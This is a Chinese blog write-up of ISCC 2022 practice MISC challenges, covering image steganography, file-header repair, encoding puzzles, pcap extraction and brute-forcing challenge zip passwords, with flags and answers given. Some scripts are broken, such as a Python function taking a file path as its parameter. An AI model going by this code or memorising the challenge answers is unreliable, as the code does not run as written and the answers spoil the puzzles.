

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="H0ne">
  <meta name="keywords" content="">
  
    <meta name="description" content="MISC2022冬奥会图片在kali中，没有显示缩略图，其宽高很可能被修改过 修改图片的长之后，下面出些一些&amp;#x编码，这是html实体编码。进行unicode解码得到冰敦敦的小伙伴经常被人冷落，你知道他的原型是什么吗？雪容融的原型是灯笼 得到一个jpg文件，把拖到010editor里得到flag通过这个题目我学会了html实体编码，还有如何修改图片的长宽。 单板小将苏翊鸣图片010edi">
<meta property="og:type" content="article">
<meta property="og:title" content="2022-ISCC(练武)">
<meta property="og:url" content="http://example.com/2023/04/20/2022-ISCC(%E7%BB%83%E6%AD%A6)/index.html">
<meta property="og:site_name" content="H0ne&#39;s Blog">
<meta property="og:description" content="MISC2022冬奥会图片在kali中，没有显示缩略图，其宽高很可能被修改过 修改图片的长之后，下面出些一些&amp;#x编码，这是html实体编码。进行unicode解码得到冰敦敦的小伙伴经常被人冷落，你知道他的原型是什么吗？雪容融的原型是灯笼 得到一个jpg文件，把拖到010editor里得到flag通过这个题目我学会了html实体编码，还有如何修改图片的长宽。 单板小将苏翊鸣图片010edi">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/65c12c58ac8f48d58e2af60df1ace555.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/506535d388d940ab9f1bc244a879628b.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/98c673c4d16243108e6cbb61d108bcbf.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/38d32a5252f64a908a4c3b5b85b1d7e3.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/b5b9f5fb610b4b10809dece5870ad9c7.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/d6243abddf7b40a8a9c4e9142b99f4d4.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1b21b899f85a4c589f1d4d4702eb3602.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/ff9be2a0dea548d7a9e9d29c1d029977.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/6b72a9aa41724436a01a61964c970af0.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/c28cdc58842f4c89a9e9615b96eaeb7e.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1d7841c601b6451687b5af93a0626f0c.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/e6b47af82c3c4d3fa36e28cf2c3ad886.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/abdafd3fa2444e26bd49d1a9e7fd536d.png![%E5%9C%A8%E8%BF%99%E9%87%8C%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E6%8F%8F%E8%BF%B0](https://img-blog.csdnimg.cn/56f2ac75f92442a6b19d51c11f4c1f0f.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/87760948f6ca401090fe8866746c7618.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/da1b9a0f32e74e839b67aaa44c8d5ba4.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/7d5738f145fa497a94cacc78550420c9.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/508bb722c1c54557802672402e1823c9.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/a1a3f7ccf45f4e2399fd6e898a7a73cf.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/37a693b5d0b442cb94c7053fe449c7b0.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/dfe7227c9705461d986f560610f41b00.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1ff918cf9fef4055aa41b885aa2189e2.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/121972a9858d4f5d8fd12ca0a2baef47.jpeg">
<meta property="og:image" content="https://img-blog.csdnimg.cn/0e046bdcd78c4a0d8fa46a0358e2c784.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1ab02116a3f24b6da5ab8c43fd3ed180.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1c839a4f2b1947b385803b3cca6f9702.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/0fe390c9a2c94ac2a576e8bbc20aeadf.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/6adf12a8a2064f9e87f7070cc137445f.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/f8aefcdbe51a4a9c9feaec28dcf01bfc.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/25a666c451a448288da711a45fdd9bf7.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/4554e711e69e4b848149a22ab35e0508.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/890096c733474017947d4a030c280787.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/65c235c58cd74997a96e37a9dd7a36cc.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/ee1e8810d90b4909936d26896f94f4d8.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/aad512f797a24ee69585a55ff24d5c65.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/f9d3711a89614bbe9a946a957b0df617.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/cc97258327bd4982b3f145b72b21039f.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/8da16153644849aeaf8a20f1fdf0c050.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/ad83bf04819d418d899dd08a1fe7c5d5.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/08b1609b36424793bbfd78b42ce34519.png">
<meta property="article:published_time" content="2023-04-20T15:33:27.597Z">
<meta property="article:modified_time" content="2023-04-20T15:19:28.767Z">
<meta property="article:author" content="H0ne">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/65c12c58ac8f48d58e2af60df1ace555.png">
  
  
  
  <title>2022-ISCC(练武) - H0ne&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/fluid-extension.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>H0ne&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2022-ISCC(练武)"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-04-20 23:33" pubdate>
          2023年4月20日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          46k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          380 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">2022-ISCC(练武)</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="2022冬奥会"><a href="#2022冬奥会" class="headerlink" title="2022冬奥会"></a>2022冬奥会</h2><p>图片在kali中，没有显示缩略图，其宽高很可能被修改过<br><img src="https://img-blog.csdnimg.cn/65c12c58ac8f48d58e2af60df1ace555.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>修改图片的长之后，下面出些一些&amp;#x编码，这是html实体编码。进行unicode解码得到<br>冰敦敦的小伙伴经常被人冷落，你知道他的原型是什么吗？<br>雪容融的原型是灯笼 得到一个jpg文件，把拖到010editor里得到flag<br><img src="https://img-blog.csdnimg.cn/506535d388d940ab9f1bc244a879628b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>通过这个题目我学会了html实体编码，还有如何修改图片的长宽。</p>
<h2 id="单板小将苏翊鸣"><a href="#单板小将苏翊鸣" class="headerlink" title="单板小将苏翊鸣"></a>单板小将苏翊鸣</h2><p>图片010editor修改高宽，下面有一个二维码 ，扫描二维码<br><img src="https://img-blog.csdnimg.cn/98c673c4d16243108e6cbb61d108bcbf.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>得到unicode编码的东西，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs unicode">\u5728\u8fd9\u6b21\u51ac\u5965\u4f1a\u7684\u821e\u53f0\u4e0a\uff0c\u6211\u56fd\u5c0f\u5c06\u82cf\u7fca\u9e23\u65a9\u83b7\u4e00\u91d1\u4e00\u94f6\uff0c\u90a3\u4f60\u77e5\u9053\u6b64\u6b21\u51ac\u5965\u4f1a\u6211\u56fd\u603b\u5171\u83b7\u5f97\u51e0\u679a\u5956\u724c\u5417\uff1f\u53c8\u5206\u522b\u662f\u51e0\u91d1\u51e0\u94f6\u51e0\u94dc\u5462\uff1f<br></code></pre></td></tr></table></figure>
<p>然后进行解码，是让我猜测冬奥会总共有几枚奖牌，有分别是几枚金牌，银牌和铜牌。<br>分别是 15 9 4 2   压缩包密码就是这几个数字合并。<br>打开就是flag。<br>这个题目收获学会修改图片高低，学会Unicode编码。</p>
<h2 id="隐秘的信息"><a href="#隐秘的信息" class="headerlink" title="隐秘的信息"></a>隐秘的信息</h2><p>给你的信息进行base64解密，解密得到<br>easy_to_find_the_flag  这是压缩包密码<br>里面有一张照片，LSB隐写，利用stegsolve查看<br>前九行，进行十六进制转二进制<br><img src="https://img-blog.csdnimg.cn/38d32a5252f64a908a4c3b5b85b1d7e3.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>ASCII码的二进制表达，是从 0000 0000 开始，到 0111 1111 结束， 1位十六进制数表示四位二进制数，比如十六进制的1二进制表示就是0001。转换要注意<br>111111010010010101001101000011010000110111101101010000011001100011010001000011011000100100110001110000011101100110101101100001010110000110010001101110001100100111001000110101011010010110100101001111011100110111110111111111000000000111111000000000000111111111111111111111000111111000111111111000000000111111111111000000000111000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011110001000100100000111100001100001101001001110001100111111101<br>ASCLL码使用指定的七位或八位二进制数组合来表示128或256种可能的组合。<br>所以，在针对ASCII码的形式进行修改后，得到<br>0100100101010011010000110100001101111011010100000110011000110100010000110110001001001100011100000111011001101011011000010101100001100100011011100011001001110010001101010110100101101001010011110111001101111101<br>转换后得到flag<br><img src="https://img-blog.csdnimg.cn/b5b9f5fb610b4b10809dece5870ad9c7.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>这个题目收获到了lsb隐写的一些操作，然后ASCII码的二进制表达，是从 0000 0000 开始，到 0111 1111 结束， 1位十六进制数表示四位二进制数，比如十六进制的1二进制表示就是0001，ascll码使用指定的七位或八位二进制数组合来表示128或256种可能的组合。</p>
<h2 id="降维打击"><a href="#降维打击" class="headerlink" title="降维打击"></a>降维打击</h2><p>图片通过010editor打开，然后发现图片的头部是89 50 4E 47,然后发现最后也有一个 89 50 4E 47,<br><img src="https://img-blog.csdnimg.cn/d6243abddf7b40a8a9c4e9142b99f4d4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>然后把后面的十六进制文本提取出来，在010editor中打开，保存图片位置，发现有一张图片。<br><img src="https://img-blog.csdnimg.cn/1b21b899f85a4c589f1d4d4702eb3602.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>利用zsteg查看这个黑白图片的各个通道的lsb<br><img src="https://img-blog.csdnimg.cn/ff9be2a0dea548d7a9e9d29c1d029977.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>发现存在一个png，输出出来<br><img src="https://img-blog.csdnimg.cn/6b72a9aa41724436a01a61964c970af0.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c28cdc58842f4c89a9e9615b96eaeb7e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>将得到的png图片对照魔女文字，即可得到flag<br><img src="https://img-blog.csdnimg.cn/1d7841c601b6451687b5af93a0626f0c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>这个题目收获了图片的头部是89 50 4E 47,通过十六进制保存图片，学会了zsteg隐写，</p>
<h2 id="藏在星空中的诗-1"><a href="#藏在星空中的诗-1" class="headerlink" title="藏在星空中的诗-1"></a>藏在星空中的诗-1</h2><p>将图片经过ps打开，把透明度拉到最高。<br><img src="https://img-blog.csdnimg.cn/e6b47af82c3c4d3fa36e28cf2c3ad886.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>得到一个顺序1,3,5,2,4，<br>又看到txt里的是特殊符号，且有序号<br>赛题又提示最好使用WinRAR，所以猜测密码是五排符号，就按13524的顺序得到xlsx文件的密码。发现是字母和字符的对照图片。<br><img src="https://img-blog.csdnimg.cn/abdafd3fa2444e26bd49d1a9e7fd536d.png![%E5%9C%A8%E8%BF%99%E9%87%8C%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E6%8F%8F%E8%BF%B0](https://img-blog.csdnimg.cn/56f2ac75f92442a6b19d51c11f4c1f0f.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>进行一一对应，就是flag。</p>
<p>本题目学会了photoshop的使用方法，如何把透明度拉到最高。也知道了WinRAR的强大。</p>
<h2 id="真相只有一个"><a href="#真相只有一个" class="headerlink" title="真相只有一个"></a>真相只有一个</h2><p>解压得到一个文本txt，一个png图片，一个无后缀名文件<br>把stream拖到010editor里面，<br><img src="https://img-blog.csdnimg.cn/87760948f6ca401090fe8866746c7618.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>文件头前端与zip源文件数据区基本相同，前两位被修改；改为50 4B 03 04，内含stream.pcapng文件。<br>对图片进行zsteg分析<br><img src="https://img-blog.csdnimg.cn/da1b9a0f32e74e839b67aaa44c8d5ba4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>猜测该文本可能与解压密码有关。然后猜测可能需要掩码爆破。<br><img src="https://img-blog.csdnimg.cn/7d5738f145fa497a94cacc78550420c9.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>所以密码就是19981111<br>然后打开是一个流量包，用wireshark打开，发现一个password.mp3文件。通过ftp查找定位到8692<br><img src="https://img-blog.csdnimg.cn/508bb722c1c54557802672402e1823c9.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>用Audacity打开，放大在末尾发现摩斯密码。<br><img src="https://img-blog.csdnimg.cn/a1a3f7ccf45f4e2399fd6e898a7a73cf.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<pre><code class="hljs">通过解密得到密码是isccmisc
最后flag.txt是snow隐写，利用密码 得到flag
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">snow<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">p</span> isccmisc -C flag.txt<br></code></pre></td></tr></table></figure>
</code></pre>
<p>这个题目学到了如何用wirshark分离mp3文件，还有压缩包如何爆破，摩斯密码可以藏在音频里。题目指令很不错。</p>
<h2 id="藏在星空中的诗-2"><a href="#藏在星空中的诗-2" class="headerlink" title="藏在星空中的诗-2"></a>藏在星空中的诗-2</h2><p>在星空中的诗1中，有一个xlsx文件，每一个星星都有对应的十六进制数字，是xlxs中每个星星对应的最后U+中的最后一个数字<br>然后拼出poem中全部的十六进制数，再转化为ascll码表就是flag</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs prolog">import json<br>flag_enc=<span class="hljs-string">&quot;全部密文&quot;</span>.replace(<span class="hljs-string">&quot;每组前三个相同的字符&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>flag_unicode_hex=[str(hex(ord(i))).upper() for i in flag_enc if i!=<span class="hljs-string">&quot;\\&quot;</span>]<br>final_flag_unicode=<span class="hljs-string">&quot;&quot;</span><br>for i in range(len(flag_unicode_hex)):<br>    # if i<span class="hljs-comment">%2==0 and i==0:</span><br>    #     final_flag_unicode +=<span class="hljs-string">&quot;\\u00&quot;</span>+flag_unicode_hex[i][<span class="hljs-number">-1</span>]<br>    if i<span class="hljs-comment">%2==0:</span><br>        final_flag_unicode +=<span class="hljs-string">&quot;\\u00&quot;</span>+flag_unicode_hex[i][<span class="hljs-number">-1</span>]<br>    else:<br>        final_flag_unicode+=flag_unicode_hex[i][<span class="hljs-number">-1</span>]<br>print(json.loads(<span class="hljs-string">&#x27;&quot;%s&quot;&#x27;</span> <span class="hljs-comment">%final_flag_unicode))</span><br><br></code></pre></td></tr></table></figure>
<p>这个题目学会了将星星转为十六进制数，将十六进制数再转化为ascll码表，题目还不错。</p>
<h2 id="小光学AI"><a href="#小光学AI" class="headerlink" title="小光学AI"></a>小光学AI</h2><p>题目是让结合机器学习的方法分析像素点的比值。<br>所给的附件中给出了训练集（training_images），password和flag.zip。训练集中给出了上百张图片和xml文件，xml文件中记录了数据xmin，xmax，ymin，ymax。<br>计算像素脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sum</span>(<span class="hljs-params">C:\Desktop\ISCC</span>):<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(path):<br>        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>            <span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&#x27;.jpg&#x27;</span>):<br>                file_path = os.path.join(root, file)<br>                <span class="hljs-built_in">sum</span> += get_pixel_sum(file_path)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pixel_sum</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">len</span>(line)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    path = <span class="hljs-string">&#x27;mushroom/&#x27;</span><br>    <span class="hljs-built_in">sum</span> = get_sum(path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">sum</span>)<br></code></pre></td></tr></table></figure>
<p>通过手动计算，得到爆破字典</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">a = <span class="hljs-number">34700</span><br>b = <span class="hljs-number">46000</span><br>c = <span class="hljs-number">56000</span><br>f = open(<span class="hljs-string">&quot;dict1.txt&quot;</span>,<span class="hljs-string">&quot;w+&quot;</span>)<br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">5000</span>):<br>    <span class="hljs-keyword">for</span> j in range(<span class="hljs-number">5000</span>):<br>        <span class="hljs-keyword">for</span> k in range(<span class="hljs-number">5000</span>):<br>            f.write(str(a+i) + <span class="hljs-string">&quot;：&quot;</span> + str(b+j) + <span class="hljs-string">&quot;：&quot;</span> + str(c+k)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>爆破字典得到打开压缩包获得flag：37035：49380：61725</p>
<h2 id="套中套"><a href="#套中套" class="headerlink" title="套中套"></a>套中套</h2><p>密码隐藏在那张图片里，补全png格式再修改高可以获的一部分， flag1: wELC0m3_<br>然后拖到stegsolove，<br><img src="https://img-blog.csdnimg.cn/37a693b5d0b442cb94c7053fe449c7b0.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>flag1: wELC0m3_T0_tH3<br>用winhex打开，最后有一段base64，解密<br>flag1和flag2合起来wELC0m3_T0_tH3_ISCC_Zo2z</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getRandom</span>(<span class="hljs-params">randomlength=<span class="hljs-number">4</span></span>):<br>	digits=<span class="hljs-string">&quot;0123456789&quot;</span><br>	ascii_letters=<span class="hljs-string">&quot;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>	str_list =[random.choice(digits +ascii_letters) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(randomlength)]<br>	random_str =<span class="hljs-string">&#x27;&#x27;</span>.join(str_list)<br>	<span class="hljs-keyword">return</span> random_str<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeKey</span>(<span 